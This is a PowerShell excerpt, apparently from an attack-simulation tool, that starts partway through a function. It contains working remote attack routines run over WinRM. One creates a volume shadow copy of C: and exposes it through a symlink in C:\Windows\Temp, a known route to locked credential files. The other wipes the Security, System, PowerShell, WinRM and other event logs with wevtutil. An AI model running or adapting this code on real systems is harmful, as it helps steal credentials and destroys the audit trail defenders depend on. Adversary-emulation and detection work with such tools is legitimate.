        return
    }
    $creation = Invoke-Command -Session $session -ScriptBlock {
        (Get-CimInstance -ClassName Win32_ShadowCopy -List).Create('C:\', 'ClientAccessible')
    } -ErrorAction Stop
    if ($creation.ReturnValue -ne 0) { throw ('Shadow copy creation returned ' + $creation.ReturnValue) }
    $newId = [string]$creation.ShadowID
    $created = @(Invoke-Command -Session $session -ArgumentList $newId -ScriptBlock {
        param($id)
        Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$id'" -ErrorAction Stop |
            Select-Object -Property Id, VolumeName, InstallDate, DeviceObject | Select-Object -First 1
    } -ErrorAction Stop)
    if ($created.Count -eq 0) { throw 'The new shadow copy was not found after creation.' }
    $linkPath = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
    $deviceObject = [string]$created[0].DeviceObject
    $exposed = Invoke-Command -Session $session -ArgumentList $linkPath, $deviceObject -ScriptBlock {
        param($link, $device)
        # Most builds already carry the GLOBALROOT prefix inside DeviceObject.
        if ($device.StartsWith('\\?\GLOBALROOT')) { $targetPath = $device }
        else { $targetPath = '\\?\GLOBALROOT' + $device }
        $output = & cmd.exe /c mklink /d $link $targetPath 2>&1
        return [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = (($output | Out-String).Trim()) }
    } -ErrorAction Stop
    if ($exposed.ExitCode -ne 0) { throw ('mklink could not expose the shadow copy: ' + $exposed.Output) }
    # The link directory itself is cleanup's problem, never the shadow copy.
    $script:ARRemoteTempDirs.Add($linkPath)
    Write-ARSuccess ('Shadow copy ' + [string]$created[0].Id + ' exposed at ' + $linkPath)
    Set-ARStatus 'Shadow copies created and exposed' 'Ok'
}

function Invoke-ARAttackEventLogClear {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Event log clear'
    $session = Get-ARTargetSession
    $logs = @(
        'Application',
        'Security',
        'System',
        'Setup',
        'Windows PowerShell',
        'Microsoft-Windows-PowerShell/Operational',
        'Microsoft-Windows-TaskScheduler/Operational',
        'Microsoft-Windows-WinRM/Operational',
        'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'
    )
    Write-ARWarn ('Event logs to wipe on ' + $target + ': ' + ($logs -join ', '))
    if (-not $script:ARAssumeYes) {
        $answer = Read-ARValue 'Type YES to clear these event logs' ''
        if ($answer -cne 'YES') {
            Write-ARWarn 'Event logs kept: the confirmation did not read YES.'
            Set-ARStatus 'Event log clear cancelled' 'Warn'
            return
        }
    }
    Write-ARInfo 'Clearing event logs with wevtutil...'
    $results = @()
    foreach ($log in $logs) {
        $result = Invoke-Command -Session $session -ArgumentList $log -ScriptBlock {
            param($name)
            $output = wevtutil.exe cl $name 2>&1
            return [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = (($output | Out-String).Trim()) }
        } -ErrorAction Stop
        $results += [pscustomobject]@{ Name = $log; ExitCode = $result.ExitCode }
    }
    $table = ($results | Format-Table -AutoSize | Out-String)
    Show-ARText $table
    $failures = @($results | Where-Object { $_.ExitCode -ne 0 })
    if ($failures.Count -gt 0) {
        $names = @($failures | ForEach-Object { [string]$_.Name + ' (exit ' + $_.ExitCode + ')' })
        Write-ARWarn ('Event logs not cleared: ' + ($names -join ', '))
        Set-ARStatus ('Event logs cleared with ' + $failures.Count + ' failure(s)') 'Warn'
        return
    }
    Set-ARStatus 'Event logs cleared' 'Ok'
}
